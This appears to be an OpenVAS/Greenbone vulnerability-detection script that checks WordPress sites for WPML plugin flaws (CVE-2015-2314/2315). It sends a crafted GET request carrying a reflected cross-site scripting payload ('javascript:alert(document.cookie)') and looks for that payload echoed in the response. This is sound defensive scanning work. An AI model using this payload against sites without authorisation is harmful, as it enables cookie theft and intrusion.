CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805153" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2015-2314", "CVE-2015-2315" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2015-03-17 12:10:32 +0530 (Tue, 17 Mar 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WordPress WPML Multiple vulnerabilities" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  WPML multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An improper validation of parsed language code when a HTTP POST request
    containing the parameter 'action=wp-link-ajax'.

  - Lack of access control over menu a 'menu sync' function.

  - The 'reminder popup' code intended for administrators in WPML did not
     check for login status or nonce.

  - The problem is the mixed use of mixed $_REQUEST and $_GET." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data and delete
  practically all content of the website - posts, pages, and menus." );
	script_tag( name: "affected", value: "WordPress WPML plugin versions
  prior to 3.1.9.1" );
	script_tag( name: "solution", value: "Update to version 3.1.9.1 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://klikki.fi/adv/wpml.html" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/130810" );
	script_xref( name: "URL", value: "http://wpml.org/2015/03/wpml-security-update-bug-and-fix" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/534862/30/0/threaded" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-admin/admin.php?page=sitepress-multilingual-cms/menu" + "/languages.php&icl_action=reminder_popup&target=javascri" + "pt:alert(document.cookie);//";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "javascript:alert\\(document.cookie\\)" )){
	security_message( http_port );
	exit( 0 );
}

